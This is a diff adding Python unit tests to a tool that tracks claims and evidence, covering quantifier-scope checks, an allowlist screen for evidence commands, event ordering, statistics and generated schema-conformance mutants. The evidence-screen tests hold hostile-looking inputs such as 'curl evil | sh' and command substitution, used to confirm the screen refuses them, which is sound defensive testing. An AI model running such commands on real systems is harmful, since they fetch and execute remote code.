@@ -214,6 +214,198 @@ class TestIntake(unittest.TestCase):
             tm.dead_literal_paths(["a.sh", "missing.sh", "docs/*.md"], tracked),
             ["missing.sh"])
 
+# ------------------------------------- quantifier-scope gate (ADR-007)
+
+class TestQuantifierScope(unittest.TestCase):
+    def test_fires_on_the_pilot_shape(self):
+        """A repo-wide clause over an --include-filtered grep: the exact
+        shape of both genuine pilot divergences."""
+        c = tm.quantifier_scope_conflict(
+            "the only occurrences in the repo are in payments",
+            "grep -rn convert --include='*.py' .")
+        self.assertIsNotNone(c)
+        q, s = c
+        self.assertIn(q, ("only", "the repo"))  # both fire; either names it
+        self.assertTrue(s.startswith("--include"), s)
+
+    def test_fires_on_path_scoped_command(self):
+        self.assertIsNotNone(tm.quantifier_scope_conflict(
+            "no call sites remain anywhere", "grep -rn frobnicate src/api"))
+
+    def test_phrase_boundary_repo_vs_repository(self):
+        """'the repo' must not fire inside 'the repository'."""
+        self.assertIsNone(tm.quantifier_scope_conflict(
+            "the repository layer caches sessions and misses stay cheap",
+            "grep -rn cache --include='*.py'"))
+
+    def test_silent_without_quantifier(self):
+        self.assertIsNone(tm.quantifier_scope_conflict(
+            "payments module converts currency",
+            "grep -rn convert --include='*.py' ."))
+
+    def test_silent_without_scoping(self):
+        self.assertIsNone(tm.quantifier_scope_conflict(
+            "no call sites remain anywhere", "grep -rn frobnicate"))
+
+    def test_silent_without_evidence_cmd(self):
+        self.assertIsNone(tm.quantifier_scope_conflict(
+            "all modules are converted", None))
+
+    def test_cd_prefix_is_a_scope_signal(self):
+        self.assertIsNotNone(tm.quantifier_scope_conflict(
+            "zero failures anywhere", "cd services && grep -c FAIL log.txt"))
+
+# ------------------------------------------ evidence screen (ADR-009)
+
+ALLOW = ["git", "grep", "cat", "wc", "echo", "sort"]
+
+class TestEvidenceScreen(unittest.TestCase):
+    def test_allowlisted_passes(self):
+        self.assertIsNone(tm.screen_evidence_command("grep -c x f.txt", ALLOW))
+
+    def test_pipeline_of_allowlisted_passes(self):
+        self.assertIsNone(tm.screen_evidence_command(
+            "grep -rn x . | sort | wc -l", ALLOW))
+        self.assertIsNone(tm.screen_evidence_command(
+            "grep -q x f.txt && echo CLEAN", ALLOW))
+
+    def test_input_redirection_passes(self):
+        self.assertIsNone(tm.screen_evidence_command("wc -l < f.txt", ALLOW))
+
+    def test_unlisted_program_refused(self):
+        err = tm.screen_evidence_command("curl https://evil.example", ALLOW)
+        self.assertIn("curl", err)
+
+    def test_unlisted_segment_in_pipeline_refused(self):
+        self.assertIsNotNone(tm.screen_evidence_command(
+            "grep x f.txt && curl evil | sh", ALLOW))
+
+    def test_output_redirection_refused(self):
+        self.assertIn("read-only",
+                      tm.screen_evidence_command("echo pwned > f.txt", ALLOW))
+
+    def test_command_substitution_refused(self):
+        self.assertIsNotNone(tm.screen_evidence_command("echo $(id)", ALLOW))
+        self.assertIsNotNone(tm.screen_evidence_command("echo `id`", ALLOW))
+
+    def test_path_form_program_refused(self):
+        """./grep is an attacker-supplied binary wearing an allowlisted
+        name; bare names resolve via PATH, paths resolve via the repo."""
+        self.assertIsNotNone(tm.screen_evidence_command("./grep x", ALLOW))
+        self.assertIsNotNone(tm.screen_evidence_command("/tmp/grep x", ALLOW))
+
+    def test_missing_allowlist_fails_closed(self):
+        err = tm.screen_evidence_command("grep x f.txt", None)
+        self.assertIn("fails closed", err)
+
+    def test_dangling_operator_refused(self):
+        self.assertIsNotNone(tm.screen_evidence_command("grep x f.txt &&", ALLOW))
+
+# --------------------------------------------- order coherence (ADR-008)
+
+class TestOrderCheck(unittest.TestCase):
+    T1, T2, T3 = ("2026-07-01T00:00:00+00:00", "2026-07-02T00:00:00+00:00",
+                  "2026-07-03T00:00:00+00:00")
+
+    def test_backdated_duplicate_id_is_an_error(self):
+        evs = events(rec("claim", claim_p(), ts=self.T2),
+                     rec("claim", claim_p(text="substitution"), ts=self.T1))
+        errors, _ = tm.order_check(evs)
+        self.assertEqual(len(errors), 1)
+        self.assertIn("duplicate id", errors[0])
+
+    def test_identical_union_merge_duplicate_passes(self):
+        """git's union merge can duplicate an identical line (equal ts);
+        first-wins under a stable sort keeps the genuine record, so this
+        must not error."""
+        r = rec("claim", claim_p(), ts=self.T1)
+        errors, _ = tm.order_check(events(r, dict(r)))
+        self.assertEqual(errors, [])
+
+    def test_later_duplicate_passes(self):
+        evs = events(rec("claim", claim_p(), ts=self.T1),
+                     rec("claim", claim_p(text="dup"), ts=self.T2))
+        errors, _ = tm.order_check(evs)
+        self.assertEqual(errors, [])
+
+    def test_small_inversion_silent_large_inversion_warns(self):
+        near = "2026-07-02T00:00:00+00:00"
+        near_minus_10s = "2026-07-01T23:59:50+00:00"
+        evs = events(rec("claim", claim_p(), rid="tr-00000001", ts=near),
+                     rec("claim", claim_p(text="b"), rid="tr-00000002",
+                         ts=near_minus_10s))
+        _, warnings = tm.order_check(evs)
+        self.assertEqual(warnings, [])
+        evs = events(rec("claim", claim_p(), rid="tr-00000001", ts=self.T3),
+                     rec("claim", claim_p(text="b"), rid="tr-00000002",
+                         ts=self.T1))
+        errors, warnings = tm.order_check(evs)
+        self.assertEqual(errors, [])
+        self.assertEqual(len(warnings), 1)
+
+# --------------------------------------------------------- stats (FS-1)
+
+class TestStats(unittest.TestCase):
+    def _world(self):
+        return events(
+            rec("claim", claim_p(cost_tier="P1"), rid="tr-000000a1",
+                ts="2026-07-01T00:00:00+00:00"),
+            rec("verdict", {"claim": "tr-000000a1", "verdict": "agree",
+                            "basis": "b"}, rid="tr-000000a2",
+                ts="2026-07-01T00:00:00+00:00"),
+            rec("invalidation", {"claim": "tr-000000a1", "commit": "c",
+                                 "reason": "r"}, rid="tr-000000a3",
+                ts="2026-07-05T00:00:00+00:00"))
+
+    def test_half_life_measured_live_to_stale(self):
+        obs, _ = tm.half_life_observations(self._world())
+        self.assertEqual(obs, [("P1", 4.0)])
+
+    def test_half_life_replay_matches_fold(self):
+        """The mini-replay must never disagree with fold() on final
+        status -- fold stays authoritative; this is the drift guard."""
+        evs = self._world() + events(
+            rec("claim", claim_p(text="second"), rid="tr-000000b1",
+                ts="2026-07-02T00:00:00+00:00"),
+            rec("verdict", {"claim": "tr-000000b1", "verdict": "retracted",
+                            "basis": "b"}, rid="tr-000000b2",
+                ts="2026-07-03T00:00:00+00:00"))
+        evs = list(enumerate([e for _, e in evs], 1))
+        _, replay_status = tm.half_life_observations(evs)
+        claims, _ = tm.fold(evs)
+        self.assertEqual(replay_status,
+                         {cid: e["status"] for cid, e in claims.items()})
+
+    def test_stats_report_splits_mechanical(self):
+        evs = self._world() + events(
+            rec("verdict", {"claim": "tr-000000a1", "verdict": "diverge",
+                            "basis": "b", "subtype": "mechanical"},
+                rid="tr-000000c1", ts="2026-07-06T00:00:00+00:00"))
+        evs = list(enumerate([e for _, e in evs], 1))
+        report = tm.stats_report(evs, NOW)
+        self.assertEqual(report["verdicts"]["diverge_mechanical"], 1)
+        self.assertEqual(report["verdicts"]["diverge_genuine"], 0)
+        self.assertEqual(report["half_life"]["P1"]["median_days"], 4.0)
+
+    def test_ttl_suggestion_threshold(self):
+        few = [("P1", 3.0)] * (tm.HALF_LIFE_MIN_OBS - 1)
+        self.assertIsNone(tm.ttl_suggestion(few, "P1"))
+        enough = [("P1", 3.0)] * tm.HALF_LIFE_MIN_OBS
+        self.assertEqual(tm.ttl_suggestion(enough, "P1"), 3.0)
+        self.assertIsNone(tm.ttl_suggestion(enough, "P0"))
+
+class TestMechanicalSubtypeFold(unittest.TestCase):
+    def test_subtype_surfaces_in_queue(self):
+        evs = events(
+            rec("claim", claim_p(cost_tier="P1")),
+            rec("verdict", {"claim": "tr-00000001", "verdict": "diverge",
+                            "basis": "b", "subtype": "mechanical"},
+                rid="tr-00000002", ts="2026-07-02T00:00:00+00:00"))
+        claims, _ = tm.fold(evs)
+        self.assertEqual(claims["tr-00000001"]["subtype"], "mechanical")
+        rows = tm.queue_rows(claims, NOW)
+        self.assertIn("mechanical", rows[0]["reason"])
+
 # ---------------------------------------------------- recheck decisions
 
 class TestRecheck(unittest.TestCase):
@@ -653,6 +845,29 @@ CORPUS = [
     ("issue_event bad ref", issue_ev("claimed", ref="bd-x1"), False),
     ("issue_event with wk envelope id",
      issue_ev("claimed", rid="wk-00000009"), False),
+    # ---- solo-regime hardening (v0.6) ----
+    ("claim with scope_basis",
+     rec("claim", claim_p(scope_basis="quantifier scoped to services/")), True),
+    ("claim empty scope_basis",
+     rec("claim", claim_p(scope_basis="")), False),
+    ("verified evidence screened false",
+     rec("claim", verified_p(evidence={"command": "cat f.txt",
+                                       "output_hash": "sha256:" + "0" * 64,
+                                       "returncode": 0,
+                                       "screened": False})), True),
+    ("verified evidence screened non-boolean",
+     rec("claim", verified_p(evidence={"command": "cat f.txt",
+                                       "output_hash": "sha256:" + "0" * 64,
+                                       "returncode": 0,
+                                       "screened": "yes"})), False),
+    ("verdict mechanical subtype",
+     rec("verdict", {"claim": "tr-00000001", "verdict": "diverge",
+                     "basis": "b", "subtype": "mechanical"}), True),
+    ("verdict bad subtype",
+     rec("verdict", {"claim": "tr-00000001", "verdict": "diverge",
+                     "basis": "b", "subtype": "cosmic"}), False),
+    ("claim negative ttl", rec("claim", claim_p(ttl_days=-1)), False),
+    ("empty envelope actor", rec("claim", claim_p()) | {"actor": ""}, False),
 ]
 
 class TestConformancePython(unittest.TestCase):
@@ -706,6 +921,84 @@ class TestConformanceSchema(unittest.TestCase):
             js_ok = not list(self.validator.iter_errors(record))
             self.assertEqual(py_ok, js_ok,
                              f"CONTRACT DRIFT on '{name}': python={py_ok} schema={js_ok}")
+
+# ---------------------- constraint-enumerated conformance corpus (FS-2)
+#
+# F1 and F8 were one defect class twice: two hand-maintained contract
+# copies drifting, sampled by a hand-curated corpus. This generator
+# derives mutants MECHANICALLY from every valid seed record -- delete
+# each field, empty each string, junk each enum-ish value -- and asserts
+# only AGREEMENT: whatever each validator says, they must say the same
+# thing. A constraint added to the schema automatically grows mutants; a
+# mirror that lags fails the suite the same day, not at the next audit.
+
+def _clone(r):
+    return json.loads(json.dumps(r))
+
+def fs2_mutants(record):
+    """Yield (name, mutant) pairs enumerating the constraint surface:
+    envelope fields, one level of payload, one level of payload dicts."""
+    out = []
+    for k in list(record):
+        m = _clone(record); del m[k]; out.append((f"del {k}", m))
+        if isinstance(record[k], str):
+            m = _clone(record); m[k] = ""; out.append((f"empty {k}", m))
+            m = _clone(record); m[k] = "__XXX__"; out.append((f"junk {k}", m))
+    p = record.get("payload")
+    if not isinstance(p, dict):
+        return out
+    for k in list(p):
+        m = _clone(record); del m["payload"][k]
+        out.append((f"del payload.{k}", m))
+        v = p[k]
+        if isinstance(v, str):
+            for nv, tag in (("", "empty"), ("__XXX__", "junk")):
+                m = _clone(record); m["payload"][k] = nv
+                out.append((f"{tag} payload.{k}", m))
+        elif isinstance(v, bool):
+            m = _clone(record); m["payload"][k] = "__XXX__"
+            out.append((f"junk payload.{k}", m))
+        elif isinstance(v, int):
+            m = _clone(record); m["payload"][k] = -1
+            out.append((f"neg payload.{k}", m))
+        elif isinstance(v, list):
+            m = _clone(record); m["payload"][k] = ["__XXX__"]
+            out.append((f"junklist payload.{k}", m))
+        elif isinstance(v, dict):
+            for kk in list(v):
+                m = _clone(record); del m["payload"][k][kk]
+                out.append((f"del payload.{k}.{kk}", m))
+                if isinstance(v[kk], str):
+                    m = _clone(record); m["payload"][k][kk] = ""
+                    out.append((f"empty payload.{k}.{kk}", m))
+    return out
+
+@unittest.skipUnless(JSONSCHEMA, "jsonschema not installed; armed-detector test governs")
+class TestGeneratedMutantsAgree(unittest.TestCase):
+    @classmethod
+    def setUpClass(cls):
+        path = os.path.join(HERE, "..", ".truth", "schema", "claims.schema.json")
+        with open(path, encoding="utf-8") as f:
+            cls.validator = JSONSCHEMA.Draft7Validator(json.load(f))
+
+    def test_every_mutant_of_every_valid_seed_agrees(self):
+        total = 0
+        for seed_name, seed, valid in CORPUS:
+            if not valid:
+                continue
+            for mut_name, mutant in fs2_mutants(seed):
+                total += 1
+                py_ok = not tm.validate_events([(1, mutant)])
+                js_ok = not list(self.validator.iter_errors(mutant))
+                self.assertEqual(
+                    py_ok, js_ok,
+                    f"CONTRACT DRIFT on generated mutant '{seed_name} / "
+                    f"{mut_name}': python={py_ok} schema={js_ok}")
+        # meta-canary: the generator is detection machinery and must not
+        # fail open by generating nothing (the F1 lesson, applied to
+        # F1's own fix)
+        self.assertGreater(total, 200,
+                           f"mutant generator produced only {total} cases")
 
 if __name__ == "__main__":
     unittest.main(verbosity=1)
